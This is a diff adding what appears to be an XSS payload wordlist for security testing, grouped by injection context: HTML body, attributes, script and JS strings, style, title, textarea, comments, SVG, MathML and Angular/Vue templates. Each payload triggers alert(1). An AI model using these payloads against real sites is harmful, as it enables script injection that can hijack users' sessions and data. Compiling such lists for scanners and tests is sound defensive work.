@@ -1,0 +1,61 @@
+# HTML body (between tags)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+# Inside double-quoted attribute
+"><script>alert(1)</script>
+" onmouseover="alert(1)
+" autofocus onfocus="alert(1)
+" style="background:url(javascript:alert(1))
+" accesskey="x" onclick="alert(1)
+# Inside single-quoted attribute
+'><script>alert(1)</script>
+' onmouseover='alert(1)
+' autofocus onfocus='alert(1)
+' style='background:url(javascript:alert(1))
+# Inside unquoted attribute
+onmouseover=alert(1)
+autofocus onfocus=alert(1)
+style=background:url(javascript:alert(1))
+# Inside script tag
+</script><script>alert(1)</script>
+';alert(1);//
+";alert(1);//
+</script><img src=x onerror=alert(1)>
+# Inside JS string
+'-alert(1)-'
+"-alert(1)-"
+\'-alert(1)-\'
+\";-alert(1)-\"
+# Inside style
+</style><script>alert(1)</script>
+</style><img src=x onerror=alert(1)>
+# Inside title
+</title><script>alert(1)</script>
+</title><img src=x onerror=alert(1)>
+# Inside textarea
+</textarea><script>alert(1)</script>
+# Inside comment
+--><script>alert(1)</script>
+--!><script>alert(1)</script>
+<!--<script>alert(1)</script>-->
+# Inside noscript
+</noscript><script>alert(1)</script>
+# SVG context
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover onend=alert(1) to=1>
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>x</text></a>
+# MathML context
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>
+<math href="javascript:alert(1)">CLICK</math>
+# Angular/Vue
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{_c.constructor('alert(1)')()}}
